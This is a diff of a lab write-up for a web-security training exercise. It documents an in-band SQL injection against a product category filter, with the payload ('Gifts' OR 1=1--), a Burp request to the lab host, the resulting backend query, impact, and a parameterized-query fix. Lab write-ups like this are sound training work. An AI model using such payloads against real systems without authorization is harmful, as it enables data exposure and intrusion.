@@ -28,7 +28,7 @@ Exploit an in-band SQL injection vulnerability in the product category filter to
 ```sql
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 
-Exploitation & Proof of Concept (PoC)
+## Exploitation & Proof of Concept (PoC)
 To retrieve hidden items, the payload must:
 
 Close the original string literal using a single quote (').
@@ -37,7 +37,7 @@ Append an always-true condition (OR 1=1) so the WHERE clause evaluates to TRUE f
 
 Comment out the remainder of the original query (AND released = 1) using the SQL double-dash comment sequence (--).
 
-Modified HTTP Request (Burp Repeater)
+## Modified HTTP Request (Burp Repeater)
 GET /filter?category=Gifts' OR 1=1-- HTTP/2
 Host: 0a6d004d042d33c0827f1abd00b00083.web-security-academy.net
 Cookie: session=[REDACTED]
@@ -61,15 +61,15 @@ Resulting SQL Query Executed on Backend:
 SQL
 SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
 
-Proof of Exploitation Screenshots
+## Proof of Exploitation Screenshots
 1. Burp Repeater Payload & HTTP 200 OK Response (Content-Length: 11600):
 
 2. Application Storefront Displaying Hidden Products & Lab Completion Banner:
 
-Impact
+## Impact
 An unauthenticated attacker can bypass business-logic filters to enumerate unpublished products, internal pricing, or sensitive records stored within the queried database table.
 
-Remediation
+## Remediation
 Primary Fix (Parameterized Queries): Use prepared statements with bound parameters so the database engine treats user input strictly as literal data rather than executable SQL syntax:
 
 cursor.execute("SELECT * FROM products WHERE category = %s AND released = 1", (category,))
